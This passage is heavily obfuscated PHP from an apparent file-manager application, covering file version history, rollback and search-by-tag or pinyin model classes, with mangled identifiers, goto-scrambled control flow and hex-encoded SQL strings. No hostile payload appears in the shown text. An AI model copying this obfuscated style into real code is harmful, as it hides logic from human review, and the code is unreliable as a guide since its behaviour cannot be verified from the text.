Ω‡áå¬¨ as $BÈ“òßà§É => $e˜⁄Ñ∏çë‰) { if (is_array($e˜⁄Ñ∏çë‰)) { $e˜⁄Ñ∏çë‰ = json_encode_force($e˜⁄Ñ∏çë‰); } $this->checkLength($e˜⁄Ñ∏çë‰, !1, $this->tableName . $f…æ¨èÆ€Ö[4] . $AæÀï»Ó†ô); $e˜⁄Ñ∏çë‰ = self::textEncode($e˜⁄Ñ∏çë‰); $B Ω‡áå¬¨ = array($f…æ¨èÆ€Ö[29] => $AÖ“ó∏ÿ◊å, $f…æ¨èÆ€Ö[89] => $BÈ“òßà§É, $f…æ¨èÆ€Ö[359] => $e˜⁄Ñ∏çë‰); $B–ùã⁄Ñº›[] = $this->filterWhere($B Ω‡áå¬¨); } if (!$B–ùã⁄Ñº›) { return !0; } goto Bçöá∞“”π; b…á¥îøô: } protected function optionDefault($DåÙ≥ƒÒªñ = '') { return !1; } public function setDeep($EÀ∏†ÃŸíú, $F¨àÇπû÷ã = false, $F•Ùá¬√ ¡ = '') { $A ÎíÓ†øÀ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][91], $EÀ∏†ÃŸíú); $DöΩããª¯∞ = $this->get(); array_set_value($DöΩããª¯∞, $EÀ∏†ÃŸíú, $F¨àÇπû÷ã); $this->set($A ÎíÓ†øÀ[0], $DöΩããª¯∞[$A ÎíÓ†øÀ[0]], $F•Ùá¬√ ¡); } public function remove($cÌØó¶µ¯Ù, $BÒ§æÜÜàü = '') { $a’˜÷¶°ﬁ¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->cacheRemove($BÒ§æÜÜàü); $eñΩâ‰ä∫ï = $this->filterWhere(array($a’˜÷¶°ﬁ¬[89] => $cÌØó¶µ¯Ù, $a’˜÷¶°ﬁ¬[29] => $BÒ§æÜÜàü)); if (is_null($cÌØó¶µ¯Ù)) { unset($eñΩâ‰ä∫ï[$a’˜÷¶°ﬁ¬[89]]); } return $this->where($eñΩâ‰ä∫ï)->delete(); } public function cacheSet($c∂ÌãÿÍ≠˘, $c…¢Ù›ï¨Ω = false) { return Cache::set($this->cacheKey($c∂ÌãÿÍ≠˘), $c…¢Ù›ï¨Ω); } public function cacheGet($Cóï¿âú«‡) { return Cache::get($this->cacheKey($Cóï¿âú«‡)); } public function cacheRemove($c¯¥≠≤∏Ñ§) { return Cache::remove($this->cacheKey($c¯¥≠≤∏Ñ§)); } protected function filterWhere($eê◊óœ·‚à) { return $eê◊óœ·‚à; } protected function cacheKey($E‚íÌ¨å∞ç) { return $E‚íÌ¨å∞ç; } } goto Aü‡ƒ»º‘√; eéç…Á»”È: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\x63\x65\137\150\151\163\x74\157\162\171"; public function addHistory($dÆˆÀöŒ∆«, $FÀﬂ«◊ÓÓ¬ = '') { $a¥æπ•—≠Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aÿπ¯Ìì®û = array($a¥æπ•—≠Ö[383] => $dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[369]], $a¥æπ•—≠Ö[1429] => isset($dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[379]]) ? $dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[379]] : $dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[378]], $a¥æπ•—≠Ö[420] => $dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[419]], $a¥æπ•—≠Ö[520] => $dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[77]], $a¥æπ•—≠Ö[2302] => $FÀﬂ«◊ÓÓ¬); $F±ÖÜú∫ˆç = $GLOBALS[$a¥æπ•—≠Ö[6]][$a¥æπ•—≠Ö[84]][$a¥æπ•—≠Ö[2303]]; if ($F±ÖÜú∫ˆç > 1) { $this->historyAutoClear($Aÿπ¯Ìì®û[$a¥æπ•—≠Ö[369]]); $this->add($Aÿπ¯Ìì®û); } Model($a¥æπ•—≠Ö[2304])->eventFileEdit($dÆˆÀöŒ∆«[$a¥æπ•—≠Ö[369]]); } private function historyAutoClear($a·ÆõÊŸˆÁ) { goto e∂“‘¶ü—¡; bñ¯ÑåõÌö: if ($Fæ´‰‡£Ïå >= 500) { return; } $c±¨ô‹ÇÜ  = array($bÂÀ≈Ω§Úô[383] => $a·ÆõÊŸˆÁ); $e„ï©í°•Ñ = $this->field($bÂÀ≈Ω§Úô[2307])->where($c±¨ô‹ÇÜ )->order($bÂÀ≈Ω§Úô[2299])->select(); goto aÔÜôÌºÑ≠; b®∫µªã®ˆ: $c±¨ô‹ÇÜ  = array($bÂÀ≈Ω§Úô[385] => array($bÂÀ≈Ω§Úô[7], $B ßªùèŸÎ)); $this->where($c±¨ô‹ÇÜ )->delete(); Model($bÂÀ≈Ω§Úô[422])->remove($f’íú…†»œ); goto aÓ≈ßÉ∆®Œ; e∂“‘¶ü—¡: $bÂÀ≈Ω§Úô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EüõÔ„ıëÇ = Model($bÂÀ≈Ω§Úô[1092])->get($bÂÀ≈Ω§Úô[2305]); $FÀßÃ…ú™é = $GLOBALS[$bÂÀ≈Ω§Úô[6]][$bÂÀ≈Ω§Úô[84]][$bÂÀ≈Ω§Úô[2303]]; goto F‡ÂôÙ∏çù; aÔÜôÌºÑ≠: if (!$e„ï©í°•Ñ || $Fæ´‰‡£Ïå >= count($e„ï©í°•Ñ)) { return; } $B ßªùèŸÎ = array_to_keyvalue($e„ï©í°•Ñ, $bÂÀ≈Ω§Úô[33], $bÂÀ≈Ω§Úô[367]); $B ßªùèŸÎ = array_slice($B ßªùèŸÎ, $Fæ´‰‡£Ïå); goto d√·Ñù±ÇÜ; F‡ÂôÙ∏çù: $B“üïÕÆŒ§ = $EüõÔ„ıëÇ == $bÂÀ≈Ω§Úô[2306] ? 3 : $FÀßÃ…ú™é; if ($FÀßÃ…ú™é <= 1) { $B“üïÕÆŒ§ = 1; } $Fæ´‰‡£Ïå = $B“üïÕÆŒ§ - 1; goto bñ¯ÑåõÌö; d√·Ñù±ÇÜ: $f’íú…†»œ = array_to_keyvalue($e„ï©í°•Ñ, $bÂÀ≈Ω§Úô[33], $bÂÀ≈Ω§Úô[419]); $f’íú…†»œ = array_slice($f’íú…†»œ, $Fæ´‰‡£Ïå); if (!$B ßªùèŸÎ || !$f’íú…†»œ) { return; } goto b®∫µªã®ˆ; aÓ≈ßÉ∆®Œ: } public function listData($AÖ¿é†è•Ô) { goto AÒ¶‘Ç·®ï; AÊ˘åã·ﬂ≈: $F≤ ÷ä”¿® = 3; if ($a≠Áàâ£⁄Ÿ == $eπàΩ∑∞ƒ◊[2306]) { $f±„Òµ¯äè[$eπàΩ∑∞ƒ◊[354]] = array_slice($f±„Òµ¯äè[$eπàΩ∑∞ƒ◊[354]], 0, $F≤ ÷ä”¿®); $f±„Òµ¯äè[$eπàΩ∑∞ƒ◊[351]] = array($eπàΩ∑∞ƒ◊[2309] => 1, $eπàΩ∑∞ƒ◊[2310] => 20, $eπàΩ∑∞ƒ◊[2311] => 1, $eπàΩ∑∞ƒ◊[2312] => count($f±„Òµ¯äè[$eπàΩ∑∞ƒ◊[354]])); } return $f±„Òµ¯äè; goto cÇÇøà˜‚ë; AÒ¶‘Ç·®ï: $eπàΩ∑∞ƒ◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eïñãè¢®£ = array($eπàΩ∑∞ƒ◊[383] => $AÖ¿é†è•Ô); $B⁄Â¥îêÖ§ = $eπàΩ∑∞ƒ◊[2308]; goto b°ÍµûúÀá; b°ÍµûúÀá: $f±„Òµ¯äè = $this->field($B⁄Â¥îêÖ§)->where($Eïñãè¢®£)->order($eπàΩ∑∞ƒ◊[2299])->selectPage(); $this->_listAppendUser($f±„Òµ¯äè[$eπàΩ∑∞ƒ◊[354]]); $a≠Áàâ£⁄Ÿ = Model($eπàΩ∑∞ƒ◊[1092])->get($eπàΩ∑∞ƒ◊[2305]); goto AÊ˘åã·ﬂ≈; cÇÇøà˜‚ë: } protected function _listAppendUser(&$dÈà¥ú∞çÓ) { $F±…å±ëÈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c´ºåŸ∏ÜÕ = array_to_keyvalue($dÈà¥ú∞çÓ, $F±…å±ëÈ[33], $F±…å±ëÈ[1438]); $f˜ÿ§∞ÜÈ = Model($F±…å±ëÈ[477])->userListInfo($c´ºåŸ∏ÜÕ); foreach ($dÈà¥ú∞çÓ as &$fî›ÖÈÇô‘) { $aï“ÿ‰ßôÙ = $fî›ÖÈÇô‘[$F±…å±ëÈ[1438]]; $fî›ÖÈÇô‘[$F±…å±ëÈ[378]] = $f˜ÿ§∞ÜÈ[$aï“ÿ‰ßôÙ] ? $f˜ÿ§∞ÜÈ[$aï“ÿ‰ßôÙ] : !1; } } public function fileInfo($Cπ°ù“∞ß†) { $CıÿâÑ¯ﬁœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÆËì¯ÒÜ° = $this->tablePrefix; $eÊ‹¡ª–™Ú = "{$eÆËì¯ÒÜ°}\x69\157\x5f\146\x69\x6c\x65\x20\146\x69\154\x65\163\x20\157\156\x20\x66\151\154\x65\163\56\x66\x69\154\x65\111\104\40\75\x20\150\151\163\164\157\162\x79\56\x66\x69\154\x65\x49\104"; return $this->alias($CıÿâÑ¯ﬁœ[2313])->where(array($CıÿâÑ¯ﬁœ[385] => $Cπ°ù“∞ß†))->join($eÊ‹¡ª–™Ú, $CıÿâÑ¯ﬁœ[2314])->find(); } public function removeItem($dø∞úÎºéÈ) { $D∆æÚÇÊ‹∞ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÙè÷èπ˘Ï = array($D∆æÚÇÊ‹∞[385] => $dø∞úÎºéÈ); $Dıë«°á‹· = $this->where($dÙè÷èπ˘Ï)->find(); if ($Dıë«°á‹·) { $DâëÈ‚∑ŸÏ = $this->where($dÙè÷èπ˘Ï)->delete(); Model($D∆æÚÇÊ‹∞[422])->remove($Dıë«°á‹·[$D∆æÚÇÊ‹∞[419]]); return $DâëÈ‚∑ŸÏ; } return !1; } public function removeBySource($CÚõô±ü˘æ) { goto FÛ¢ó≠µÏ°; FÛ¢ó≠µÏ°: $FÆÒôòóèŸ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$CÚõô±ü˘æ) { return !1; } if (!is_array($CÚõô±ü˘æ)) { $CÚõô±ü˘æ = array($CÚõô±ü˘æ); } goto fò”Ãôùàê; bò˘”‰°øñ: return !0; goto Aπ¡€Ÿ…¥¨; fò”Ãôùàê: $f®†—–çÃè = array($FÆÒôòóèŸ[383] => array($FÆÒôòóèŸ[7], $CÚõô±ü˘æ)); $a»õûµªÏÔ = $this->field($FÆÒôòóèŸ[420])->where($f®†—–çÃè)->select(); if ($a»õûµªÏÔ) { $this->where($f®†—–çÃè)->delete(); $DŒÃÀ«òº˘ = array_to_keyvalue($a»õûµªÏÔ, $FÆÒôòóèŸ[33], $FÆÒôòóèŸ[419]); Model($FÆÒôòóèŸ[422])->remove($DŒÃÀ«òº˘); } goto bò˘”‰°øñ; Aπ¡€Ÿ…¥¨: } public function setDetail($a¨¢œœ≤æ£, $FôèÖıêíº) { $aô≤ﬂ◊àâî =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return $this->where(array($aô≤ﬂ◊àâî[385] => $a¨¢œœ≤æ£))->save(array($aô≤ﬂ◊àâî[2302] => $FôèÖıêíº)); } public function rollbackToItem($A∆é≠æÿùê, $cãÚ˜ÑÜé©) { goto Cä¢©çâ–≠; b∑Ê›”Ñï√: $a•õ‡¥¨¡ç = $this->find($cãÚ˜ÑÜé©); $e ¯´æ¯ÁÒ = array($A∑©Üÿê∫Á[419] => $a•õ‡¥¨¡ç[$A∑©Üÿê∫Á[419]], $A∑©Üÿê∫Á[77] => $a•õ‡¥¨¡ç[$A∑©Üÿê∫Á[77]], $A∑©Üÿê∫Á[107] => time(), $A∑©Üÿê∫Á[379] => USER_ID); Model($A∑©Üÿê∫Á[761])->where(array($A∑©Üÿê∫Á[369] => $A∆é≠æÿùê))->save($e ¯´æ¯ÁÒ); goto b˘√‹Ùìß¿; b˘√‹Ùìß¿: return $this->where(array($A∑©Üÿê∫Á[385] => $cãÚ˜ÑÜé©))->delete(); goto a˘ÚÈª±·–; Cä¢©çâ–≠: $A∑©Üÿê∫Á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eè¿à®“◊Î = Model($A∑©Üÿê∫Á[761])->sourceInfo($A∆é≠æÿùê); $this->addHistory($eè¿à®“◊Î); goto b∑Ê›”Ñï√; a˘ÚÈª±·–: } public function clearSame($dª±àö˜Óä) { goto FˆêôıÀí›; FˆêôıÀí›: $E•Êüóß∑· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F¢·Ñ◊√ôÑ = $this->listData($dª±àö˜Óä); $AûæÙäî µ = array_to_keyvalue_group($F¢·Ñ◊√ôÑ, $E•Êüóß∑·[419]); goto bäÌ»•√∞ö; bäÌ»•√∞ö: $eÖ”Ÿ¯√ É = array(); $fÜÖãõÔåä = array(); foreach ($AûæÙäî µ as $dÆÈãﬁâï) { if (!$dÆÈãﬁâï || count($dÆÈãﬁâï) <= 1) { continue; } foreach ($dÆÈãﬁâï as $Aàîºúæ¢) { $eÖ”Ÿ¯√ É[] = $Aàîºúæ¢[$E•Êüóß∑·[419]]; $fÜÖãõÔåä[] = $Aàîºúæ¢[$E•Êüóß∑·[367]]; } } goto cë˜Àñ†›Î; cë˜Àñ†›Î: if (!$fÜÖãõÔåä) { return; } $this->where(array($E•Êüóß∑·[367] => array($E•Êüóß∑·[7], $fÜÖãõÔåä)))->delete(); Model($E•Êüóß∑·[422])->remove($eÖ”Ÿ¯√ É); goto fü∑à∫é–ì; fü∑à∫é–ì: } public function userSpace() { $c±ãÜ®µâ— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A€û◊◊´¿ø = $this->tablePrefix; $b∫ππ¬Ã™” = array($c±ãÜ®µâ—[1429] => USER_ID); $dê§√ú©Óæ = "{$A€û◊◊´¿ø}\151\x6f\137\146\x69\154\145\x20\146\151\x6c\145\x73\x20\x6f\156\40\146\x69\154\145\163\56\x66\151\x6c\145\111\x44\40\x3d\x20\x68\x69\163\x74\157\162\171\x2e\x66\x69\154\145\x49\x44"; return $this->alias($c±ãÜ®µâ—[2313])->where($b∫ππ¬Ã™”)->join($dê§√ú©Óæ, $c±ãÜ®µâ—[2314])->sum($c±ãÜ®µâ—[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B§¯≤êÁì“) { goto FÆöﬁß’ÕÌ; eÏ™¢ïåî€: if (!$B¨∑ÓàÇê‡) { return array(); } $eå∏áª–∞ã = $B¨∑ÓàÇê‡[$d⁄ä¬ç»Ç‰[160]]; $b®èÙ»ƒËä = $d⁄ä¬ç»Ç‰[7]; goto BÉ÷∂Ú—«Ï; FÆöﬁß’ÕÌ: $d⁄ä¬ç»Ç‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÉ¡¢∂ãÍ = KodIO::fileTypeList(); $B¨∑ÓàÇê‡ = $dÉ¡¢∂ãÍ[$B§¯≤êÁì“]; goto eÏ™¢ïåî€; BÉ÷∂Ú—«Ï: if (!$B¨∑ÓàÇê‡[$d⁄ä¬ç»Ç‰[160]]) { $eπºû‡Í–° = array_to_keyvalue($dÉ¡¢∂ãÍ, $d⁄ä¬ç»Ç‰[33], $d⁄ä¬ç»Ç‰[160]); $eå∏áª–∞ã = implode($d⁄ä¬ç»Ç‰[47], $eπºû‡Í–°); $b®èÙ»ƒËä = $d⁄ä¬ç»Ç‰[2265]; } $eœ¥£ÇúÇ≈ = explode($d⁄ä¬ç»Ç‰[47], trim($eå∏áª–∞ã, $d⁄ä¬ç»Ç‰[47])); return array($b®èÙ»ƒËä, $eœ¥£ÇúÇ≈); goto A¥Îã¡–Îî; A¥Îã¡–Îî: } public function listPathType($F€ıÖöÍí¡) { $Dñº€Ûê°ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÌàÉúŒ“· = $this->fileTypeWhere($F€ıÖöÍí¡); if (!$AÌàÉúŒ“·) { return array(); } $b∑ÃÍê»í÷ = array($Dñº€Ûê°ó[521] => SourceModel::TYPE_USER, $Dñº€Ûê°ó[522] => USER_ID, $Dñº€Ûê°ó[518] => 0, $Dñº€Ûê°ó[519] => $AÌàÉúŒ“·); return $this->listSource($b∑ÃÍê»í÷); } public function listSearch($FÀ ¢ÑøÛ±, $B∑°ÈÛ∆ì‡ = 300) { goto Aπ¯√€◊çª; FÑœÛê¯ú≤: $this->_listSearchDesc($Fü¡≠êà¥, $FÀ ¢ÑøÛ±, $e°ÊΩ†ó˘º); $this->_listSearchTag($Fü¡≠êà¥, $FÀ ¢ÑøÛ±, $e°ÊΩ†ó˘º); $this->_listDataApply($Fü¡≠êà¥[$E∏ÃÏ¬«çΩ[354]]); goto cüŒıÎˆÛØ; cüŒıÎˆÛØ: $this->_listMake($Fü¡≠êà¥); return $Fü¡≠êà¥; goto b Î¢“Á◊å; e’™øø·Á±: $this->_listSearchBindPinyin($FÀ ¢ÑøÛ±, $DöÕÑÿ¡•í, $bâäæŒªÿà); $this->alias($E∏ÃÏ¬«çΩ[487])->_makeOrder()->cache(null, 10); $Fü¡≠êà¥ = $this->distinct(!0)->field($bâäæŒªÿà)->where($DöÕÑÿ¡•í)->selectPage($B∑°ÈÛ∆ì‡); goto FÑœÛê¯ú≤; Aπ¯√€◊çª: $E∏ÃÏ¬«çΩ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($FÀ ¢ÑøÛ±[$E∏ÃÏ¬«çΩ[2183]]) && $FÀ ¢ÑøÛ±[$E∏ÃÏ¬«çΩ[2183]]) { $FÀ ¢ÑøÛ±[$E∏ÃÏ¬«çΩ[2183]] = str_replace($E∏ÃÏ¬«çΩ[1594], $E∏ÃÏ¬«çΩ[2315], trim($FÀ ¢ÑøÛ±[$E∏ÃÏ¬«çΩ[2183]])); } $DöÕÑÿ¡•í = $this->_parseSearchWhere($FÀ ¢ÑøÛ±); goto có¡Ù◊∫ëù; có¡Ù◊∫ëù: if (!isset($DöÕÑÿ¡•í[$E∏ÃÏ¬«çΩ[397]])) { $DöÕÑÿ¡•í[$E∏ÃÏ¬«çΩ[397]] = 0; } $bâäæŒªÿà = $E∏ÃÏ¬«çΩ[2316]; $e°ÊΩ†ó˘º = $bâäæŒªÿà; goto e’™øø·Á±; b Î¢“Á◊å: } private function _listSearchTag(&$aµ™–Œ”ëÚ, $féÛøÛÿñ†, $CË¶…ã•¡é) { goto BœÜÛÜüö; Fúåå›êºÁ: $cˆàË÷—·Ã = array_to_keyvalue($cˆàË÷—·Ã, $EèÂÁÍÁèâ[33], $EèÂÁÍÁèâ[75]); $C‹§ç¥œ°ü = array_unique($cˆàË÷—·Ã); $this->_listSearchMerge($aµ™–Œ”ëÚ, $féÛøÛÿñ†, $CË¶…ã•¡é, $C‹§ç¥œ°ü); goto Fı◊Ó˘ò€ó; Bâ¢ø·∫“ë: if (!$dΩáÓØ¨Ë–) { return; } $Dæ”µŸ∂©Ó = array($EèÂÁÍÁèâ[393] => array($EèÂÁÍÁèâ[7], $dΩáÓØ¨Ë–)); $cˆàË÷—·Ã = Model($EèÂÁÍÁèâ[394])->field($EèÂÁÍÁèâ[75])->where($Dæ”µŸ∂©Ó)->select(); goto Fúåå›êºÁ; AÀÆ∫¨Ôïç: $dΩáÓØ¨Ë– = array(); $F®ºÙﬂ¬ŸÑ = $féÛøÛÿñ†[$EèÂÁÍÁèâ[2183]]; foreach ($D‰âÌãç è as $c≠ ›≠ˆÂà) { $E«∑—˜¶¯ = $c≠ ›≠ˆÂà[$EèÂÁÍÁèâ[28]]; $EÁπÃÎü±é = str_replace($EèÂÁÍÁèâ[50], $EèÂÁÍÁèâ[33], Pinyin::encode($E«∑—˜¶¯)); if (stripos($E«∑—˜¶¯, $F®ºÙﬂ¬ŸÑ) !== !1 || stripos($EÁπÃÎü±é, $F®ºÙﬂ¬ŸÑ) !== !1) { $dΩáÓØ¨Ë–[] = $c≠ ›≠ˆÂà[$EèÂÁÍÁèâ[367]]; } } goto Bâ¢ø·∫“ë; BœÜÛÜüö: $EèÂÁÍÁèâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$féÛøÛÿñ†[$EèÂÁÍÁèâ[2183]] || $aµ™–Œ”ëÚ[$EèÂÁÍÁèâ[351]][$EèÂÁÍÁèâ[340]] > 1) { return; } $D‰âÌãç è = Model($EèÂÁÍÁèâ[2317])->listData(); goto AÀÆ∫¨Ôïç; Fı◊Ó˘ò€ó: } private function _listSearchDesc(&$bæ·“‹™Ò¶, $b‰çÀã™ò‹, $a†∏†π’ôî) { goto C¥√˘€Çıâ; C¥√˘€Çıâ: $dÑØëïò§ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$b‰çÀã™ò‹[$dÑØëïò§ÿ[2183]] || $bæ·“‹™Ò¶[$dÑØëïò§ÿ[351]][$dÑØëïò§ÿ[340]] > 1) { return; } $a¶ﬂÑ≈ë€∆ = $this->listSearchChildren($b‰çÀã™ò‹[$dÑØëïò§ÿ[461]]); goto Bë≥ˆÍ«Î‘; Bë≥ˆÍ«Î‘: $a¶ﬂÑ≈ë€∆ = array_unique($a¶ﬂÑ≈ë€∆); if (!$a¶ﬂÑ≈ë€∆) { return; } $e§ŒÇëª∂â = array($dÑØëïò§ÿ[369] => array($dÑØëïò§ÿ[7], $a¶ﬂÑ≈ë€∆), $dÑØëïò§ÿ[89] => $dÑØëïò§ÿ[405], $dÑØëïò§ÿ[359] => array($dÑØëïò§ÿ[760], $dÑØëïò§ÿ[2185] . $b‰çÀã™ò‹[$dÑØëïò§ÿ[2183]] . $dÑØëïò§ÿ[2185])); goto Dº≥£íëûì; Dº≥£íëûì: $DÜ±å‚ú£™ = Model($dÑØëïò§ÿ[504])->field($dÑØëïò§ÿ[369])->where($e§ŒÇëª∂â)->select(); $CÇÏçÍÍØÕ = array_to_keyvalue($DÜ±å‚ú£™, $dÑØëïò§ÿ[33], $dÑØëïò§ÿ[369]); $this->_listSearchMerge($bæ·“‹™Ò¶, $b‰çÀã™ò‹, $a†∏†π’ôî, $CÇÏçÍÍØÕ); goto e¶õÀ†ÈÀÂ; e¶õÀ†ÈÀÂ: } private function _listSearchMerge(&$fÖ™™Ëâˆê, $CÃìøπ«‚‹, $d©È´˘∂º‹, $BÉ¿ìƒå≤Â) { goto E©Æ¶√∞Ï‡; C≥√¯µÌ≤û: foreach ($F¯Í—ÓÒé• as $AõÖ¨√çëã) { $cﬁøüØ„ÜÉ = $F∫…ùû”À˘[47] . $CÃìøπ«‚‹[$F∫…ùû”À˘[461]] . $F∫…ùû”À˘[47]; if (stripos($AõÖ¨√çëã[$F∫…ùû”À˘[459]], $cﬁøüØ„ÜÉ) !== !1) { $a€ùìœßŸ”[] = $AõÖ¨√çëã; } } $fÖ™™Ëâˆê[$F∫…ùû”À˘[354]] = array_merge($a€ùìœßŸ”, $fÖ™™Ëâˆê[$F∫…ùû”À˘[354]]); $fÖ™™Ëâˆê[$F∫…ùû”À˘[351]][$F∫…ùû”À˘[352]] += count($a€ùìœßŸ”); goto cèÓÌÔ∑õò; aÊ¥âÔ·Õ§: $d–ù«ìïåï = array_diff($BÉ¿ìƒå≤Â, $aóÒß√•ÖÕ); if (!$d–ù«ìïåï) { return; } $eŸú—©äﬁç = array($F∫…ùû”À˘[369] => array($F∫…ùû”À˘[7], $d–ù«ìïåï)); goto B—øñŸ»ÿ; E©Æ¶√∞Ï‡: $F∫…ùû”À˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$BÉ¿ìƒå≤Â) { return; } $aóÒß√•ÖÕ = array_to_keyvalue($fÖ™™Ëâˆê[$F∫…ùû”À˘[354]], $F∫…ùû”À˘[33], $F∫…ùû”À˘[369]); goto aÊ¥âÔ·Õ§; B—øñŸ»ÿ: $F¯Í—ÓÒé• = $this->field($d©È´˘∂º‹)->where($eŸú—©äﬁç)->select(); if (!$F¯Í—ÓÒé•) { return; } $a€ùìœßŸ” = array(); goto C≥√¯µÌ≤û; cèÓÌÔ∑õò: } public function listSearchChildren($Aë„¯Õ›§Á, $Cè¥¢ÖÓ¬ÿ = 5000) { goto c Æ∫®Û™°; F≠ﬁ—´íﬁã: $d°ÈÙˆˆ≈à = $this->field($B√±ëûÎœÀ[369])->where($aµœ±ı®∑Ã)->select(); $B÷ïÜıÒÈ◊ = array_to_keyvalue($d°ÈÙˆˆ≈à, $B√±ëûÎœÀ[33], $B√±ëûÎœÀ[369]); return $B÷ïÜıÒÈ◊; goto bπÕ∑ãæÓ; c Æ∫®Û™°: $B√±ëûÎœÀ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B÷ïÜıÒÈ◊ = array(); $E◊àÿﬂèÁÍ = $this->sourceInfo($Aë„¯Õ›§Á); goto eıÆ‡à¨Âæ; eıÆ‡à¨Âæ: $aµœ±ı®∑Ã = array($B√±ëûÎœÀ[459] => array($B√±ëûÎœÀ[760], $E◊àÿﬂèÁÍ[$B√±ëûÎœÀ[459]] . $E◊àÿﬂèÁÍ[$B√±ëûÎœÀ[369]] . $B√±ëûÎœÀ[484])); $F¡´»£•⁄” = $this->field($B√±ëûÎœÀ[369])->cache(null, 600)->where($aµœ±ı®∑Ã)->count(); if ($F¡´»£•⁄” > $Cè¥¢ÖÓ¬ÿ) { return $this->_listSearchChildrenNear($Aë„¯Õ›§Á, $Cè¥¢ÖÓ¬ÿ); } goto F≠ﬁ—´íﬁã; bπÕ∑ãæÓ: } private function _listSearchChildrenNear($bìùÒ¿™‹Ω, $E¡ÒÒΩ”îè) { goto f∂Öô”»¨¢; f∂Öô”»¨¢: $BÜ¯÷‰ËΩÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eáé∂∂Çáú = array(); $b≤üÑ∂íÇ = array($BÜ¯÷‰ËΩÔ[461] => $bìùÒ¿™‹Ω); goto B•àØË«Áµ; Få„∆‚úàø: $eáé∂∂Çáú = array_merge($eáé∂∂Çáú, array_to_keyvalue($eê’⁄†∂à´, $BÜ¯÷‰ËΩÔ[33], $BÜ¯÷‰ËΩÔ[369])); $eáé∂∂Çáú = array_slice($eáé∂∂Çáú, 0, $E¡ÒÒΩ”îè); return $eáé∂∂Çáú; goto b∆â™ÍÖØé; B•àØË«Áµ: $eê’⁄†∂à´ = $this->field($BÜ¯÷‰ËΩÔ[2318])->where($b≤üÑ∂íÇ)->select(); $a¶á¶‘«« = array_to_keyvalue(array_filter_by_field($eê’⁄†∂à´, $BÜ¯÷‰ËΩÔ[370], $BÜ¯÷‰ËΩÔ[83]), $BÜ¯÷‰ËΩÔ[33], $BÜ¯÷‰ËΩÔ[369]); $eáé∂∂Çáú = array_merge($eáé∂∂Çáú, array_to_keyvalue($eê’⁄†∂à´, $BÜ¯÷‰ËΩÔ[33], $BÜ¯÷‰ËΩÔ[369])); goto Dª≤˘ÆÍñæ; Dª≤˘ÆÍñæ: if (!$a¶á¶‘««) { return $eáé∂∂Çáú; } $b≤üÑ∂íÇ = array($BÜ¯÷‰ËΩÔ[461] => array($BÜ¯÷‰ËΩÔ[7], $a¶á¶‘««)); $eê’⁄†∂à´ = $this->field($BÜ¯÷‰ËΩÔ[2318])->where($b≤üÑ∂íÇ)->select(); goto Få„∆‚úàø; b∆â™ÍÖØé: } private function _listSearchBindPinyin($fÚ®éÓöŒâ, &$B—ˆ∞°¥æ™, &$bÓ∞ÛàíŒø) { goto cÁù©£÷±¶; DÉêØËïç—: $a˜÷Üèá∏Ö[] = array($EÑ‡™ÈÁ≈À[2322] => $eµ€‰€áÇÏ, $EÑ‡™ÈÁ≈À[918] => $EÑ‡™ÈÁ≈À[2187], array($EÑ‡™ÈÁ≈À[2323] => $eµ€‰€áÇÏ, $EÑ‡™ÈÁ≈À[2324] => array($EÑ‡™ÈÁ≈À[7], array($EÑ‡™ÈÁ≈À[416], $EÑ‡™ÈÁ≈À[415])))); $this->join($eŸÉåÑ¬‚é); $B—ˆ∞°¥æ™ = $a˜÷Üèá∏Ö; goto f≠˘Â§›á›; DƒÍ‡Ù∫‚®: unset($B—ˆ∞°¥æ™[$EÑ‡™ÈÁ≈À[28]]); foreach ($B—ˆ∞°¥æ™ as $eÇ∂çÑ®Ëâ => $Cî¥Â¬ﬂÂú) { $a˜÷Üèá∏Ö[$EÑ‡™ÈÁ≈À[2320] . $eÇ∂çÑ®Ëâ] = $Cî¥Â¬ﬂÂú; } $eµ€‰€áÇÏ = array($EÑ‡™ÈÁ≈À[483], $EÑ‡™ÈÁ≈À[2185] . $fÚ®éÓöŒâ[$EÑ‡™ÈÁ≈À[2183]] . $EÑ‡™ÈÁ≈À[2185]); goto DÉêØËïç—; cÁù©£÷±¶: $EÑ‡™ÈÁ≈À =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!Input::check($fÚ®éÓöŒâ[$EÑ‡™ÈÁ≈À[2183]], $EÑ‡™ÈÁ≈À[306]) || strlen($fÚ®éÓöŒâ[$EÑ‡™ÈÁ≈À[2183]]) < 2) { return; } $eŸÉåÑ¬‚é = "\x4c\x45\x46\x54\40\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\137\163\x6f\165\x72\143\145\137\155\145\x74\x61\x20\x6d\145\x74\141\40\157\x6e\40\x73\x6f\x75\162\x63\x65\56\x73\157\165\x72\x63\x65\x49\x44\40\75\x20\x6d\145\x74\141\56\163\x6f\x75\x72\143\145\x49\x44"; goto 